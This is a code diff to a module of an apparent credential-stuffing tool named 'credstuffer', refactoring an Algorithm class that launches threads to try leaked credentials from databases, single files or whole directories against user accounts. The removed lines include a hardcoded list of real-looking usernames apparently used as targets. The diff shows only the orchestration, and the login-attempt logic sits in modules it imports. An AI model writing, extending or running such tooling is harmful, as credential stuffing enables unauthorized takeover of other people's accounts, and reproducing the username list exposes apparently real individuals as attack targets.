@@ -4,79 +4,35 @@ from time import sleep
 from credstuffer import UserAccount
 from credstuffer.database_stuffer import DatabaseStuffer
 from credstuffer.file_stuffer import FileStuffer
-
-usernames = [
-    "shagattack",
-    #"Gandi",
-    #"Alki 90",
-    #"seitzfabi",
-    #"Cologne881",
-    #"Dömers123",
-    #"Mes35904",
-    #"alexvögerl",
-    #"seitzdani",
-    #"Michl85",
-    "bierschi"
-]
+from credstuffer.directory_stuffer import DirectoryStuffer
 
 
 class Algorithm:
-    """ class Stuffing to execute the credential stuffing algorithm
+    """ class Algorithm to execute the credential stuffing algorithm
 
     USAGE:
-            stuffing = Stuffing()
-
+            algo = Algorithm(accounts=accounts, usernames=usernames)
+            algo.file_stuffing(filepath='/tmp')
     """
-    def __init__(self, accounts, filepath=None, **dbparams):
+    def __init__(self, accounts, usernames):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Algorithm')
 
-        usernames = ["Gandi", "Alki 90", "seitzfabi", "Cologne881", "Dömers123", "Mes35904", "alexvögerl", "seitzdani", "Michl85", "bierschi"]
-        self.dbparams = dbparams
-        self.filepath = filepath
-
+        self.usernames = [user.strip() for user in usernames]  # strip leading trailing whitespaces
         self.accounts = accounts
+
         for account in self.accounts:
             account.set_usernames(usernames=usernames)
 
         self.schema_list = list('abcdefghijklmnopqrstuvwxyz')
 
-    def execute(self):
-        """
+    def database_stuffing(self, **dbparams):
+        """ creates the DatabaseStuffer instance and starts the run thread
 
-        :return:
-        """
-
-        for account in self.accounts:
-            if isinstance(account, UserAccount):
-                if self.filepath is None:
-                    processes = list()
-                    for c_schema in self.schema_list:
-                        stuffer = DatabaseStuffer(account=account, schema_char=c_schema, **self.dbparams)
-                        stuffer.start()
-                        processes.append(stuffer)
-                        if len(processes) == 6:
-                            wait = True
-                            while wait:
-                                for proc in processes:
-                                    if not proc.is_alive():
-                                        self.logger.info("Start new Process")
-                                        wait = False
-                else:
-                    stuffer = FileStuffer(account=account, filepath=self.filepath)
-                    stuffer.start()
-            else:
-                # handle email accounts
-                pass
-
-    def database(self, account):
-        """
-
-        :return:
         """
         processes = list()
         for c_schema in self.schema_list:
-            stuffer = DatabaseStuffer(account=account, schema_char=c_schema, **self.dbparams)
+            stuffer = DatabaseStuffer(account=self.accounts, schema_char=c_schema, **dbparams)
             stuffer.start()
             processes.append(stuffer)
             if len(processes) == 6:
@@ -88,17 +44,19 @@ class Algorithm:
                             wait = False
                     sleep(1)
 
-    def files(self, account):
-        """
+    def file_stuffing(self, filepath):
+        """ creates the FileStuffer instance and starts the run thread
 
-        :return:
         """
-        # handle multiple files, start a thread for each given file in file directory
-        pass
+        # handle one file for credential stuffing
+        stuffer = FileStuffer(account=self.accounts[0], filepath=filepath)
+        stuffer.start()
 
-    def map_usernames(self):
-        """
+    def directory_stuffing(self, dirpath):
+        """ creates the DirectoryStuffer instance and starts the run thread
 
-        :return:
         """
-        pass
+        # handle multiple files within the given dirpath
+        stuffer = DirectoryStuffer(account=self.accounts[0], directory_path=dirpath)
+        stuffer.start()
+
